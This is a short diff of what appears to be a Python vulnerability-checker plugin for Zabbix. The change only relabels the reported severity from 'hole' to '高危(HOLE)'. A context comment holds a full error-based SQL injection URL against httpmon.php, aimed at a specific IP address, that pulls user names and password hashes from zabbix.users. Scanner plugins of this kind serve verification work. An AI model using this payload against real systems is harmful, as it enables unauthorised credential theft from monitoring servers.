@@ -39,7 +39,7 @@ class P(T):
             result['VerifyInfo']['URL'] =target_url
             result['VerifyInfo']['payload']=vul_url
             result['VerifyInfo']['result'] =info
-            result['VerifyInfo']['level'] = 'hole'
+            result['VerifyInfo']['level'] = '高危(HOLE)'
             return result
         else:
 	    # 'http://61.142.83.60:8443/zabbix/httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)'
@@ -64,7 +64,7 @@ class P(T):
                 result['VerifyInfo']['URL'] =target_url
                 result['VerifyInfo']['payload']=vul_url
                 result['VerifyInfo']['result'] =res_html
-                result['VerifyInfo']['level'] = 'hole'
+                result['VerifyInfo']['level'] = '高危(HOLE)'
                 return result
         return result
 
